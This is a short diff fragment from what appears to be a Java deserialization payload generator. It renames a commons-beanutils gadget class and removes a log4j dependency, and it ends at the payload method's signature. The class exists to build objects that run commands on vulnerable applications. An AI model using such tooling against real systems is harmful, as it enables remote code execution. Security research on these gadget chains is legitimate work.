@@ -10,9 +10,9 @@ import org.apache.logging.log4j.util.PropertySource;
 import java.util.PriorityQueue;
 
 
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
 @Authors({"SummerSec"})
-public class CommonsBeanutilsPropertySource implements ObjectPayload<Object> {
+public class CommonsBeanutilsPropertySource192 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         final Object template;
